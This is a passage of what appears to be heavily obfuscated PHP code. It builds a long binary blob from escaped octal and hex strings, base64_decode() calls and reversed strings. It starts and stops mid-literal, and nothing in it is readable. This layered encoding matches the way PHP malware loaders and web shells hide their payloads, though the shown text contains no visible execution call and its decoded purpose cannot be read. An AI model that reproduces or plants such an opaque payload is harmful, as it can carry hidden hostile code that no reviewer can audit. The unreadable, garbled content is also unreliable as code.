Ñ‰Ö½¢æÕiÏkÉİb:.ã\'øùÏ‡ÖN+çï®üŸåÈÎW›Íõ¹ùá')."\367\137\71\371\105\343\133\306\61\365\201\227\66\106\56\374\345\322\223\177\365\213\236\210\371\112\146\342\333\77\364\34\263\360\350\143\357\317\175\362\301\1\27\257\177\305\373\247".base64_decode('kwaXLdmb12b+9KzjZxwWeHvNxvae+/N3vv5+f5c5fdL2U3/y19TVO6+9/MLa/Y7y')."\305\67\357\163\365\353\147\256\135\366\321\175\57\37\377\162\103\173\223\177\321\145\336\253\376\325\176\346\371\253\6\103\53\276\75\243\365\363\321\133\273\136\70\142\171\157\307\266"."\245\7\234\366\323\366\124\356\323\321\334\216\356\137\276\364\320\266\55\317\55\73\244\147\361\57\166\76\161\335\213\311\372\33\26\337\367\344\312\225\333\322\337\235\274\337\360\304".base64_decode('m78zbZ9XD7xpxv3bD7/j4KHDFhy088w67a+ff7Vh3O17fl84uv6C4Pjb3+i547OH')."\x66\x6c\xbc\xfa\xb7\x57\x3f\xfb\xe0\x7\x33\xdf\xd9\xee\x37\x7e\x72\xe2\x55\x1f\xcf\x6b\xce\x6f\xf8\xde\xea\x3b\xaf\x7b\xee\x86\xf5\x5d\xeb\x26\xdd\x79\xc4\xf7\xce\x7f\x71\xc7\x97\xab\xfe\xfd".base64_decode('ly3aMZed/9TH1mH/2PP3x8/b9+KJM1u2Hdk3+OE7/d9f88/HX/jlr3p3/Hj0i8tv').base64_decode('faNpzYpP//npysVbf9W45otnP954es+qr1566vKtvv988NRA8c0/n/Dx2XM+N673').base64_decode('fOV5e3rTI//rkvNqa85Tnn3opw37bFx+kvL8X8213pvvWHz3RYdNuvyMwwP3P3TX')."\306\63\352\17\275\347\231\36\273\175\352\147\157\154\333\172\317\337\227\237\173\336\352\203\342\377\336\366\227\47\214\5\267\335\334\351\251\61\326\36\132\173\311\370\342\345\357\276"."\377\324\233\67\136\174\365\131\57\354\377\307\343\346\74\263\175\346\375\205\355\205\65\247\373\317\333\360\347\211\107\137\276\341\255\143\366\14\335\367\316\151\333\122\127\126\277\335".base64_decode('fNOXG7Yeoe9TfDm1dfGvZmyvfeJ3W1vvu2Dnsj97Pr9oq33RrMk7zw+3vXjyi8f0').base64_decode('f/mHrWdumt+88ICdkbXvXbjgO5evf3Wj55dJ85Gh8LZHP667wXh42bcO+PGF+187')."\x7b\x81\xff\xbf\xaf\xa9\x79\xe5\x90\xb3\x7f\x96\xdb\xfe\xde\xf4\x6b\x3e\x7f\x60\xd5\x86\x7f\xff\xfb\xd1\x73\xfe\x71\xd6\x7\x29\xdf\xcd\x17\xac\x7e\xfc\x85\x6b\xea\x7f\xd9\xf8\xb7\xb3\x8f\x6a"."\x78\xfa\xad\x7b\xd3\xcf\x5d\x7f\xec\x2e\xed\xc1\xc1\xc4\xfb\xe6\xe5\xd\x85\xd1\xc1\x4d\x7\x5e\x3b\xbf\xff\xb4\x97\x33\xb9\xeb\x37\x1f\x73\xed\x57\xc3\x9b\x5f\xca\x76\x35\x7e\xfa\xa3\xdb\x6e"."\372\367\217\232\126\135\361\354\214\277\375\336\376\323\353\167\174\152\157\135\264\265\352\212\37\154\335\365\247\367\66\357\176\172\113\360\341\343\277\272\166\333\303\207\175\154\335\262"."\274\367\222\325\363\327\305\227\356\74\341\311\353\326\135\173\344\113\263\77\133\265\373\260\27\117\130\370\142\165\172\347\242\277\125\17\55\211\151\337\77\160\347\223\333\207\367\213".strrev('İß³ÉËÈì=«ï×şÚw\\¾íÇ|ˆŞCæüùè­´N,Ö+»öÜ=·wMÚùiœ')."\257\352\306\347\372\166\314\174\47\164\310\354\3\253\76\371\147\340\356\3\337\370\115\102\357\370\355\211\331\273\137\77\112\71\360\107\163\266\155\250\372\244\156\113\317\357\16\70"."\375\324\357\234\165\124\46\232\273\377\107\277\313\114\137\332\175\345\22\255\45\171\304\341\55\236\365\173\167\37\65\173\351\143\351\147\315\245\227\75\177\340\274\217\57\273\40\373"."\203\143\337\37\67\157\355\207\67\276\160\132\303\266\273\367\334\376\327\340\222\374\267\172\76\365\374\352\213\175\176\22\177\145\317\243\267\235\163\305\317\367\216\277\107\33\154\70"."\xe9\xac\x29\xdf\x3b\xe4\xd1\x3\x33\x7b\x5e\xfb\xf1\x65\x3b\x7e\xf8\xfa\xf8\xf3\x6f\xba\xef\xc9\xce\xa7\xd5\xff\x7a\xff\x90\xfb\xc6\x5\x7e\x3c\xce\x13\x48\x3e\x7d\xe1\xdf\x6e\xdf\x6f\xc9\xb9"."\xe7\x5f\x70\xf1\xba\x6d\x8a\xe6\xfb\xe3\xb2\xaa\xdc\xab\xb7\x4f\x6d\x58\xfc\xe5\x53\x5d\xc9\xc7\x6f\x49\xe7\x1f\xae\x1f\xb9\xf7\xca\x99\xef\x3c\xf7\xfc\xc2\x23\xef\xfd\xf0\xd7\xbf\x7e\xe2\x2f"."\13\237\351\76\350\300\225\237\56\133\371\360\237\116\270\51\64\356\235\155\213\126\277\373\366\157\256\174\374\374\27\37\270\147\371\154\173\372\346\267\257\74\143\140\355\353\315\53"."\6\156\75\315\277\371\151\377\217\116\274\240\261\164\370\175\217\154\114\144\137\173\61\374\217\145\125\327\317\157\276\361\207\236\247\236\333\235\134\160\334\357\176\73\355\304\313\254"."\332\107\367\354\176\150\322\53\175\233\157\121\336\270\350\341\326\373\137\375\316\346\326\133\177\376\374\72\345\350\307\153\256\333\264\340\277\127\116\352\353\351\232\271\153\351\300\374"."\xef\xd5\x76\x7f\xf7\xea\xae\x6f\x5f\xfc\x8a\xf7\xbf\xd7\xc4\x6f\xb\xbf\xb8\xee\xa9\xb7\xfe\xf3\xc0\xf0\x67\x2f\x3c\xfe\xfe\x23\xf\xfc\xf3\xa3\xc5\x6f\x9d\xb8\xc6\xfa\xea\x8d\x37\xae\x5b\xf3".base64_decode('0du7q5/1ffX51vdPXzX41btP3elTm1b/+Iv3zd+8cf+aR1Z9+tFH92x8Zs3HX34c')."\235\363\310\277\366\274\277\370\77\137\374\153\215\272\346\327\223\266\325\74\367\376\75\337\276\345\260\63\117\115\356\270\62\372\233\252\341\376\177\77\63\363\232\177\74\363\345\316".strrev('hÔv†óCua¾ÎÓ¨ü9>CŞùõXÌæ×Åå»^¯m÷şş6ËÂø<Íòéx~·').base64_decode('Gq985pniF7c0rxjRS5svWfqfu+5M/OnS9htXHRvYO27WU/tqs573HuN56KY3F2Se')."\277\137\317\276\173\134\352\24\353\130\373\157\127\15\354\54\174\265\346\343\351\125\77\270\360\150\146\344\63\165\6\160\75\123\247\100\100\113\366\31\243\203\300\14\236\72\355\124".base64_decode('JiIZTq4owikNZLaTp4BS1sjwQK4vBVKxqdOgonwqWdCZuQLouBmDxVT/MFQzbToc')."\147\255\221\201\234\315\56\250\322\53\372\264\24\60\370\251\102\46\227\35\205\266\114\207\246\14\257\130\76\230\313\202\340\211\65\132\317\214\56\317\301\165\71\264\152\372\14\320"."\144\154\230\1\367\141\305\345\375\53\6\271\42\143\172\330\264\212\160\177\76\154\365\217\14\346\41\62\230\132\236\265\55\370\300\212\221\121\155\170\0\42\123\352\241\15\123\47"."\x43\xdb\x47\xcc\xfe\x81\x34\xb3\x4c\xb2\xf2\xe6\x8a\x91\x1c\xe4\xcd\x8d\x8c\x66\x93\x79\xe8\x88\x99\xb6\xec\xe1\x41\x10\xdd\x4e\x9f\xa\x85\x47\x2d\xc4\x7c\xf7\xc1\x61\x67\x4a\x1d\xb4\x52\x4f"."\x59\xc5\x81\x15\xec\x88\x33\xa8\x59\xcb\xd3\x50\x70\xa\x2b\x88\x4e\xd1\x25\x7b\x14\xee\x97\xa7\x4c\x86\xcb\xfa\x81\xd4\x48\xb1\x34\xc\x79\x4b\x29\xc3\x46\x9d\x85\x69\x84\x91\x98\x56\x7\x81"."\xc9\x75\x30\x21\xd3\xea\x1\x32\x90\x1f\x36\x8b\x43\x4c\x25\xb6\x30\x68\xe\xc\xc1\x84\xce\x60\x13\x3a\x85\xe1\xca\xf4\x69\x6c\x64\xa7\x43\x9b\x7\x8b\x69\x63\x98\x9\x3\xcd\xfe\x11\x34\x24".base64_decode('cE7Vl5srsgPQqEGtP2+by6ENU2GiZkyZwnoCgZJmp9JMJjC9AaCT6wHxpk2F1peG')."\365\102\37\103\205\334\120\332\34\146\107\307\301\345\175\146\312\2\51\133\276\244\133\375\313\341\154\320\227\55\246\13\313\231\206\146\41\73\150\14\1\352\325\117\206\6\115\153"."\x80\x69\xee\x2f\xa0\x63\xd1\x28\x4c\xc5\xe4\x6\xf8\x6a\x43\xfd\x34\x86\xea\xd0\xa0\xe9\xc\x37\x8d\xc1\x15\xf9\xd1\x21\x40\x87\x53\x4f\xad\x67\x68\x3\xe3\x95\x1b\x4c\xad\x28\x30\xc5\xd7\xc9".strrev('Ï/'."\n".'ô*œ3>@ÕØÕP³IĞå™ı'."\n".'†ıµÇ€á¤ŒÏ.ÍA‚Ì1ô-Údşš¡“')."\x6a\x23\x46\x1a\xda\x51\x3f\x1d\x3e\x3f\x63\x6\x6b\xf8\xa9\x10\x98\x76\x2a\xe0\x4e\xc6\xce\xa5\xf4\x1\x8d\xe1\x19\xf4\xcb\xec\x1b\xb2\x6c\xa6\x95\x39\x94\x4f\xe\x18\x23\xd0\xf8\xe1\xa1\xe2"."\xa8\x99\x65\xf4\xa0\x1\xaa\xb3\xd2\xd9\xd4\xb0\xc1\x4\x8b\xd6\xe0\x50\x8a\xc9\xf6\xb3\x5a\x72\xd8\x62\x18\xdb\x97\x49\x2d\x37\xd3\xa3\x6c\x10\xa1\xf0\xc\x18\xde\x7e\x2d\x33\xd2\x37\x0\xdf".base64_decode('6esfzWjszuJUNkEz6qazwFSG0DAD9VMYdWJ9rZ/Bpg2GYSpfBTMYqZgyjeEk/eWq')."\250\315\132\162\200\11\132\145\175\116\156\206\225\367\345\264\74\127\243\151\207\36\46\145\325\175\71\303\200\256\63\245\157\246\126\56\364\64\100\177\24\340\106\116\27\202\142\52"."\232\147\45\305\101\30\113\35\44\115\17\34\215\313\265\44\363\266\224\214\142\216\324\270\155\26\271\156\11\325\132\363\341\26\372\344\256\56\315\61\345\333\12\267\172\40\2\265".base64_decode('rCGzCEM2YKaSiD6lHLWm+hx1cig7ubtT0mPAUT0ODWwGcwxWH5k0VY742HD3SRNK')."\245\327\266\146\15\370\144\260\127\116\65\362\250\25\331\254\317\151\105\252\222\377\140\14\250\245\242\205\365\225\363\342\106\330\32\220\6\36\233\177\166\165\252\211\100\174\201\244".strrev('E.;İÎå»Û?C÷e¿Yîw¥Ïl¼ow‡Öïd0ÀCyGA¨–êCB©:Í‡Ú')."\321\135\17\154\330\275\345\272\267\257\134\267\353\201\365\273\36\70\143\357\71\367\276\277\375\302\335\33\267\356\75\173\307\356\153\66\355\276\371\234\135\17\357\330\373\253\163\336".base64_decode('2nTBrgc277nmvN3r7tv18GW7z/357nM27vnZ+l07rkH595wrakbZdm++Apfdftbu')."\x7\x1e\xd8\x7b\xc3\x26\x9e\xfa\xfe\xf6\x33\x81\x90\x1\xfd\x9c\xa7\xdb\xd8\xaa\x93\xe9\x6b\x91\xd1\x51\x66\x2b\x80\x90\xba\xe5\x53\x3a\xb3\x3a\x1a\x61\x85\xa8\xad\x60\xe5\x2e\x3b\xa3\x17\x15"."\x9b\x28\x79\x69\xe8\x5f\xde\xcc\x7b\x29\xc2\x51\x8b\x59\x4b\x31\xf2\x38\x59\x61\x73\xe3\xe3\x48\x99\xd0\x73\x5\x8c\x5a\x30\x4a\x7e\x6a\x55\xe7\x50\xeb\x97\xf0\xaf\xd2\x30\xd3\x84\xa\x68\x85"."\xc7\x5a\xcc\x55\xd\xe\xc2\x7d\x17\x16\xa4\x29\x69\xd\x1\x52\x8d\x4a\x1a\x15\x53\x98\x71\x8c\x62\x9b\x2c\x9c\x1b\xe1\x93\xee\x5a\x4\x15\xa7\x95\x37\x83\x4d\x6d\x3f\x97\x67\xb\x31\x2b\x34"."\114\62\322\240\167\32\145\50\105\126\225\223\44\70\326\233\223\230\310\111\316\221\0\71\50\271\216\367\50\264\51\36\205\134\302\52\116\23\122\174\275\316\256\254\345\65\46\67"."\277\250\27\262\322\165\114\141\244\342\40\312\255\221\157\200\135\135\213\127\30\106\336\71\107\42\132\327\45\273\102\106\171\264\145\271\253\141\266\144\21\241\23\327\206\344\202\134"."\x74\x83\x46\x85\xbc\x17\x7d\x88\xd3\xc9\xa2\x9e\x32\x98\x52\xb2\x9e\x23\x39\x99\x45\x7\x91\x32\x73\x6d\xe8\x24\x5a\x2\x45\xc7\x65\xd1\xac\x39\x85\x4c\x1\x1b\xe0\xdb\x33\xe7\x80\xa1\x2f\x5c".base64_decode('vqnSdyEsbIpkaNZ9AcUXTGuzZAaPszV6vV5JkCq0vHAIqhMXswgWxKt5LHgrV1dA')."\313\274\277\137\267\354\106\142\236\247\114\122\120\103\147\370\352\121\200\54\210\251\276\351\50\110\106\11\26\161\17\214\134\311\142\66\63\23\174\123\200\75\265\146\202\256\305\114".base64_decode('QkuapOYDXJQq5bMMioIoS6yUxzPc6Oyznk9JhWZqSVuqVU3DoPrEeGiTRLqeOgkm')."\106\32\245\41\310\300\312\166\70\347\35\365\337\313\121\1\115\57\142\27\122\26\121\142\205\35\7\252\264\44\313\345\230\300\42\134\234\14\327\327\24\265\345\51\57\40\226\44"."\317\265\127\255\254\306\56\366\54\154\14\222\327\71\376\225\54\131\235\137\27\313\31\353\175\253\150\147\147\173\40\302\134\65\145\100\326\160\250\131\155\15\305\104\71\265\120\162"."\xeb\x32\xca\x8e\x23\x2\x9d\x21\x35\x1e\x8f\x4a\x9a\x8d\xc4\x6c\x72\x89\xba\x20\xda\xaa\xb6\x44\xa3\xb\x42\x80\x94\x30\xd\x8d\x12\xdd\xc4\x66\x76\xe2\x82\x17\xc7\x84\xb9\x1d\xbe\x13\x91\xd5"."\xbb\x64\xc6\x4\x5b\xf6\xe3\xcd\x37\xae\x80\x16\x27\xc2\xfe\x96\xf6\x40\x8c\xeb\xce\x4f\xf5\xd5\xf9\xea\x45\x5e\xf4\x41\x15\x9b\x10\x34\x31\x2b\xe2\x78\x22\x10\xab\xe0\xdf\x81\xfa\x7d\x80\x29".base64_decode('Al8PUKA9ulhpiYa7OiJx6taAwiNRKZ1oSEMy8/5QngzVBzvDgZagEookoswEgiup')."\x12\xe3\x97\x38\x8f\xb3\x21\x28\x5a\x3a\xf7\xee\x0\xe5\x69\x44\x36\xd0\x91\x6b\xe4\x35\x1\x52\x77\x7b\xaa\x7b\xaa\x7a\x26\xf6\xd4\xf4\xd4\x2e\xf3\xf5\x58\xbd\x7e\x69\x27\x33\xe4\xe9\x81\x48"."\x67\x2b\x74\xaf\x91\x87\x52\x16\x2c\xe7\x8e\x78\x7c\x21\x98\xee\x45\x63\x81\x96\x30\x6b\x4a\x73\x20\xe\xc1\x68\x4b\x88\x6\xde\xba\xe4\xae\x5d\xf\x6d\x78\xeb\xea\x2d\xbb\xcf\x5b\x8f\x2a\xda".base64_decode('c9VZey6/DzEumFnZcuFbj2zYc8nWPRcCk6Hs3Xr/rh2/euuSTbu3XLHnsgffumot')."\115\170\373\266\273\166\237\277\211\67\114\171\373\147\217\354\331\160\13\147\140\50\337\342\101\245\337\136\267\376\255\35\133\60\373\162\323\31\173\266\135\260\347\232\365\273\317\277".strrev(' T[·èµ´<$Ö=¼:_cc§ı_¬¦ÍŞ4HÉ=/[½úÉşïg÷u°ÚŞ›•÷a')."\x5f\xa6\x18\x4e\x94\x85\x17\x76\x5\x23\x2d\x41\xb7\x85\x92\x1c\x5\xd7\x18\x13\x29\x86\x50\x65\x13\xe0\x35\x2d\x70\xad\xc1\xe2\xc4\xc2\xbe\xa9\x7a\xcc\x56\xac\x82\xf9\x97\x1a\x25\x35\xa6\x35".strrev('ë'."\n".'¥XÒyr–ÌÒ_4GGk™5(™\\Ë/­Ì<E±ãA'."\0".'Ó@¶áj\'Ï³ ƒš…‰o')."\126\124\171\360\216\104\314\245\224\52\274\243\42\200\236\104\113\257\6\373\77\40\112\264\325\113\253\75\165\236\372\132\5\374\234\320\22\340\335\104\251\2\325\161\136\316\361\21"."\x4f\x9f\x23\x56\xef\xa9\xab\x55\xaa\xa\x3\x55\xd0\x2e\x31\xae\xa8\xf5\x2a\xcd\x69\x29\x9a\xa7\x6\x1a\x2c\x37\x57\xe4\x45\xd4\xcc\xb2\x8b\x9a\x81\xc8\x9b\x92\xf4\x70\x10\x2f\x8f\x7e\x1d\x1e"."\113\222\76\121\202\316\23\312\341\206\51\201\110\253\63\47\165\164\322\131\115\264\24\223\76\233\73\122\140\323\134\135\253\364\201\45\104\205\104\122\314\61\30\115\216\301\250\231".strrev('fÀ#‘	¯'."\0".'A°SÀ(üĞäĞ7Q5å‹gJU2PbÍ,Ú8+P æjoŸs¢t').base64_decode('w/kkVkgjHmiqKEdI+5mz+hmpA88nHUt5HxguK4w14f5rsD1fMNHSTrE8LqF5qm+C')."\x3\x51\xc5\x70\x2a\xe\x14\xe1\xc7\xa\xc8\x47\x97\xb\x26\x8\xe3\x48\xbe\x50\xa4\x2d\x1a\xeb\xa0\x76\x6c\xf1\x96\xf6\x60\x47\xc0\x7\x44\x9c\x62\x2\xcd\x8f\xf9\x2e\xa5\x49\xa9\xc6\x94\x8f"."\202\252\35\303\117\76\304\206\54\101\276\212\326\225\152\43\46\212\216\102\241\37\32\3\263\257\20\123\164\215\24\151\252\246\76\43\240\112\356\150\51\32\113\250\150\0\200\74"."\113\124\267\132\332\55\44\5\153\154\216\65\310\316\3\151\304\25\231\314\125\106\252\217\111\75\121\345\270\316\226\150\244\55\304\114\366\132\341\264\135\110\231\216\114\255\261\20".base64_decode('dkoA31dYVZKhJIoIvQYUKTDpHAoL+3qcwPd8FBFbPorwzQbnkhxH4e/HIzwsGF8U')."\351\212\63\123\15\114\175\27\267\362\160\73\67\254\306\11\321\230\24\11\304\2\35\161\36\215\55\346\246\37\34\106\115\100\324\110\127\207\240\370\341\300\42\204\54\121\301\240".strrev('\'<èá«,¯âyÆyÎÕ4;0òº¶™G½ew¨ÒØbË™ı ÑÕZ‡¶§8›ã]j0').base64_decode('Dq2C+ZQ4myjdCmKDE4INttjWxVeDgnBYoaa6SiS6OCB8JEkJABEuk/ynd/cM9fgQ')."\263\140\55\23\126\162\255\315\12\143\103\132\310\331\236\212\0\240\164\200\155\243\313\74\260\143\250\131\263\237\371\73\101\4\221\261\13\364\167\11\13\20\132\11\5\320\201\267".base64_decode('kGXmctROT+1Z1XNKj9dHTRMx89LjEU1Sg0vQHhuPO+wqVeIGCGpHvYQQXbU0Mgt+')."\340\44\66\13\330\123\210\316\156\342\223\31\134\270\52\202\376\315\113\254\12\242\177\141\364\23\116\240\351\62\170\6\264\44\303\241\5\301\125\370\217\110\250\345\3\111\55\220"."\234\5\102\221\125\350\57\42\60\253\102\21\167\145\315\301\304\342\140\220\146\140\141\370\25\131\21\301\201\256\112\16\317\260\6\75\44\13\215\172\250\132\125\153\310\140\172\173"."\47\325\252\252\337\352\2\174\341\216\47\152\252\307\327\127\303\36\22\210\267\10\352\353\100\210\162\134\40\372\356\116\104\340\156\274\40\76\57\26\355\352\224\342\355\201\105\241".strrev('æ²®ve(–$E”En”½s$[	8`qÉ‹¼(Èaj!£ŠÒµP‰¡dOó<È')."\256\120\270\125\66\45\307\31\141\103\41\124\35\366\224\11\254\161\54\116\214\312\131\4\17\71\13\23\164\143\21\62\6\54\102\7\200\305\310\160\261\10\361\142\306\42\244\243"."\54\202\117\47\301\10\113\103\47\106\164\332\143\307\300\214\66\310\155\41\147\246\372\44\7\25\230\6\373\250\324\14\373\46\101\247\70\215\313\66\135\202\121\42\243\222\304\0".base64_decode('VAdOkUyy/RSEuE0CRL89y+YQbngZQ0xq92snDDvr+ArYB6KvhIhRpvQdZnNAJIKq')."\x29\x49\xa5\xc9\x46\x2d\x3\x84\xc\x8a\x8a\xb0\x41\xdc\x2b\x44\x39\x58\xf7\x8f\x8\x82\x69\xd4\x79\x84\xe2\x74\x69\x19\x3f\x19\x81\xd3\xc\xf\xfc\x42\x8b\xe\xa7\x3f\x3d\x10\x65\x22\xc\xb0"."\x23\xa9\xf6\xc0\x26\xcb\x6c\xf\x9c\xa7\xe3\x9e\x9e\xaa\xb1\x46\xb\x32\xb0\x31\x83\x68\x15\x8d\xb2\x52\x6\xdf\xf3\x92\x19\xec\xe8\x44\xb5\x73\x4c\x4\x4e\xe\x67\x42\xd8\x4c\x5\xd6\x22\xde".strrev('T¢\\Ò(T³­u©€­]šœ!Ú¦­,\\Ğux‚ÄµZÀÕÜEMR‚»Ô)µ	DRv‹').base64_decode('qWFV01QorKC1yCpSympiNdC2wpWYlTGHFBm92Hm5hcISAuXKWDPiJ4GZtXrgUM5T').base64_decode('KEdMk0JxtGGHw6SnKMmwMCPrUbg7AwzEhw8q9ISKWAKtiCYFlyRiAQwk3Oeh49B/')."\204\240\340\323\121\61\247\121\123\112\302\263\371\226\201\220\140\231\203\105\244\314\43\146\22\1\203\310\226\47\365\211\247\20\111\1\35\146\131\216\260\0\270\156\32\353\214\205"."\72\2\261\245\60\144\342\14\0\53\320\314\72\54\176\105\304\260\272\44\233\363\10\152\265\154\203\116\347\230\123\130\164\236\145\24\26\265\6\26\0\236\171\32\4\247\223\52".strrev('Ë'."\n".'èßj3$ñ$Ş&+ÂN6Ê§"³¸³‘U¹1XÚæaëšf”Bf)7')."\20\30\52\145\101\160\351\327\254\21\326\322\112\153\204\245\61\161\14\137\155\320\237\232\251\320\77\352\155\242\246\1\235\111\113\171\354\116\205\373\344\203\126\301\336\332\225\210"."\xaa\x68\xff\x88\x5\x31\x35\x87\x1e\xf1\x61\x95\xda\x2b\x9d\xbb\xe5\x49\x81\x6a\x70\x6\xee\x62\xf4\x6b\xba\xc6\xf2\x54\xea\x1a\x2f\xcf\x25\x4f\xc1\xc8\xbc\x50\x24\xd8\xd4\x31\x12\x8a\x7\x3a".base64_decode('FNZwkK1hT3wzoJ5QVA0jnliVxWehKIh8fX2yqxFVeCzxaUIf2i6WJM+Qhkl0jzu4')."\x99\x2\x51\x96\x46\x8\x11\x10\x9e\xa\xb8\x58\x9a\xa4\x95\xfa\x70\x69\x79\xbb\x82\xf2\x2e\x6f\x8a\x86\xd9\x88\x53\x70\x66\xca\xa5\xcc\x14\xd9\x55\xc7\xc7\xdd\xca\xc7\x32\x58\xe8\x41\x8b\x9b"."\134\166\163\214\366\41\107\201\56\311\323\0\56\254\260\17\222\273\234\274\263\171\150\277\314\62\27\111\252\56\172\223\323\55\213\337\350\222\303\17\13\332\31\341\150\101\166\146"."\331\332\314\106\256\224\267\343\172\26\144\354\255\175\104\213\134\30\177\11\3\33\111\273\234\134\217\210\351\240\156\105\135\5\241\246\20\357\257\224\113\0\303\302\173\45\276\231"."\20\165\366\262\43\274\350\344\250\301\166\66\367\275\36\157\144\336\354\324\213\71\203\134\301\54\26\366\54\74\135\227\21\240\322\0\173\353\245\57\110\26\174\70\12\23\211\357".strrev('”‡c…x»ÌN¤2G	ñK"ß°€~ìŠMÁ é±¤ŞùŸI@%‰ ×+ËµRˆS%')."\46\333\61\112\76\233\117\222\147\234\114\235\100\274\264\41\173\171\360\11\107\236\34\227\347\362\1\307\366\275\160\61\216\371\340\264\52\265\245\223\347\117\162\217\315\164\64\244"."\141\46\0\32\44\253\117\151\24\215\150\107\55\65\213\43\22\16\110\320\16\346\373\10\334\210\206\315\176\116\70\20\173\10\136\257\34\304\43\24\205\262\76\35\33\367\120\123"."\13\154\212\305\13\122\67\146\337\134\250\113\362\244\72\306\172\257\130\256\5\62\362\17\26\211\54\347\233\77\30\323\305\226\214\212\21\133\252\157\54\44\350\37\371\22\51\44"."\321\114\127\31\202\216\324\356\3\146\76\3\311\2\307\20\241\216\104\325\166\264\27\104\31\307\140\130\11\7\355\145\245\200\24\330\210\241\111\372\211\231\52\234\307\146\222\213"."\174\172\235\10\223\275\22\221\125\36\142\12\24\340\112\113\354\324\1\372\263\64\227\362\242\206\3\326\245\164\233\273\60\302\324\214\231\364\341\66\113\166\275\71\116\375\206\44"."\347\220\332\240\216\115\247\230\264\243\114\217\5\272\122\336\71\150\42\276\225\212\107\273\142\354\352\4\307\261\310\110\215\5\133\226\362\133\14\16\155\13\54\162\103\102\130\344".base64_decode('F5hXEcwFURhOTnxqLIoldsFwm6tAvJ378nTC1HAosqBiAuIbOqQiFBhKBDvcMGcN')."\361\140\40\306\234\300\342\170\163\70\332\42\45\207\242\345\43\301\31\23\16\244\362\76\12\364\237\136\323\263\222\34\131\32\321\311\45\265\12\13\6\274\152\357\244\332\71\75"."\xab\x6b\x6b\x7a\xfc\x73\x7c\x13\xb9\x3c\x8b\x92\x2b\xc9\x70\x74\xc\xb0\xc5\x36\x91\x46\x37\x0\xef\x3f\xc\x48\x8b\x41\xcc\xef\xf3\xc1\x47\x78\xc0\xdf\xe3\x67\x7e\xb2\xfc\x3c\x91\x67\x72\xed"."\x1c\xe0\x79\x39\x4e\x5d\xd\x39\x9a\xe7\x72\x71\xc1\x6c\xc7\x7d\x6e\xa7\xa2\x2a\xb6\x51\x55\xf9\x42\xc3\x77\xa0\x6a\x7c\x69\x9c\x4f\x9\xc5\xcf\x4a\xe9\xe\x24\xa4\xd9\x64\x15\x5\x57\x66\xf4"."\257\123\316\212\265\142\52\146\164\140\261\303\106\127\6\371\14\123\54\20\261\222\123\146\262\204\75\33\211\151\21\26\275\10\344\163\124\201\150\370\200\70\166\303\102\214\263\5"."\233\107\333\43\354\277\55\210\213\234\327\36\232\277\40\334\21\211\166\56\214\305\23\135\213\26\57\131\12\356\35\33\31\236\244\25\57\163\114\6\16\113\375\203\132\321\77\310"."\134\156\57\302\207\0\335\362\313\314\25\7\242\76\42\32\310\50\230\237\312\6\170\52\46\30\376\312\111\264\66\177\56\157\327\217\221\243\263\250\367\231\246\75\106\352\242\216"."\257\257\30\22\273\173\254\136\216\230\51\175\20\202\102\15\315\22\107\37\340\53\274\262\353\157\214\252\62\253\227\352\163\61\0\0\20\56\201\44\66\101\0\211\371\243\360\203"."\233\7\126\150\204\135\203\20\257\140\55\46\377\14\370\344\234\207\175\162\62\177\234\53\210\247\110\267\233\311\25\136\155\300\221\56\374\352\256\360\242\43\242\43\356\162\65\211"."\xd5\x11\xb8\x73\x5d\x1c\xb1\x78\x4c\x5e\x12\x64\xab\xe0\xda\x35\x78\x43\x6a\x77\xad\x46\xe\xe4\x4e\x80\xe3\x44\xef\xb0\x51\x99\x2\x9e\xb2\xdb\x10\x6b\x2c\xd9\x33\x32\x5f\xc5\x82\x75\xc2\xec"."\26\161\16\115\243\36\105\370\330\147\362\116\172\210\70\311\265\100\210\103\27\301\117\47\145\233\177\106\141\163\3\102\217\53\67\300\65\56\222\16\16\3\157\346\42\126\224\230".base64_decode('CHB3j9KaR5jOFNhENo/EpNc6HP4W5AcCtEKhJYP74Fi1DlBSjqSxnoisbQKiPKps').base64_decode('6kPJrZSTS/H8lgjxWUxL8+uoLsWotsUWR1az7EUOBzTf6JYYO1ro4NwqZ5T8pmX5')."\261\127\77\302\36\162\155\252\150\234\135\122\70\373\102\125\132\244\323\44\70\26\343\336\165\271\357\135\341\240\227\312\226\151\70\310\235\211\40\56\67\320\217\375\107\230\171\366"."\332\103\160\270\140\132\272\354\357\71\245\23\57\223\334\140\132\162\243\234\323\206\361\212\141\112\146\222\103\145\346\236\130\166\361\207\7\314\233\163\70\200\37\366\242\256\273\134"."\x12\x5b\xba\x3e\xc0\x54\xe1\x24\x8e\x97\x9f\x6a\x3b\xb9\xab\x61\x77\x77\x30\xca\x8a\xc5\x5b\xe4\xce\xa5\xe9\xb5\xa4\xb7\x22\xc0\x2b\x39\x1e\xa0\x58\x2b\xb9\x2a\x47\xed\x82\xaa\x71\x33\xe1\xe4"."\233\41\143\303\216\304\364\347\264\112\275\366\26\205\357\147\64\227\364\201\201\5\372\10\363\253\354\242\55\56\127\314\75\363\172\72\172\22\362\60\331\105\55\235\106\315\226\234"."\x7e\x3a\xda\x22\x3c\x3f\x3\xfa\x91\x37\x1\xd8\x60\x8c\xed\x37\x1a\xa4\xef\xa7\x54\x74\x3b\xd\x89\x84\xc5\xf5\x17\x89\x66\x96\x67\x88\xb3\x11\x7e\xf2\xb8\x48\x5\xdc\x5d\x88\xe1\x80\xbd\x69"."\xa1\xce\x55\x28\x49\xef\xdb\xc8\xf8\x82\xb7\x7\xae\xb1\x85\x8f\xc6\xd4\x5b\x37\xa3\xf6\xc4\x8b\x36\x78\xe9\x6f\x62\x3d\x42\x43\x97\x6f\x36\x53\xb0\x93\xae\xac\x42\x98\x58\xd5\x58\x35\xbe\x6"."\375\326\126\171\252\60\3\104\342\170\26\61\200\264\243\252\161\174\15\11\324\202\47\220\121\320\313\227\374\233\212\53\137\220\346\314\101\103\53\335\123\314\41\243\201\327\176\203"."\xbf\xc1\x3f\x4\xf4\x60\xce\xa\xfc\x45\xf1\xd4\x86\xdb\xd3\xf4\xb0\xaa\xe5\x46\x99\xfc\x5d\x95\xbd\x29\x83\x9f\x66\x18\x75\x39\xa5\x9d\xb7\x84\xf9\x59\xee\x68\x85\xea\x97\x78\x3\x1d\xa7\x79"."\205\307\341\131\163\206\163\131\5\216\65\115\325\365\276\272\152\205\75\305\322\124\335\225\150\363\316\250\236\63\373\320\131\55\344\326\322\326\73\360\265\43\76\164\323\323\346\154".base64_decode('uFWYhZcXj/idsbHKAv7ltFEzrw1ZiELlfEkYzC5OxYS377xuD5lFuJIFXq2BmSJl').base64_decode('JNqTs9jSJhKORiyIY93vKoyU8l585vXGZWdvrvcF6pz58anVmV8mjUlBPnIiSN+K')."\150\124\344\7\104\44\27\273\104\42\102\127\45\323\56\0\30\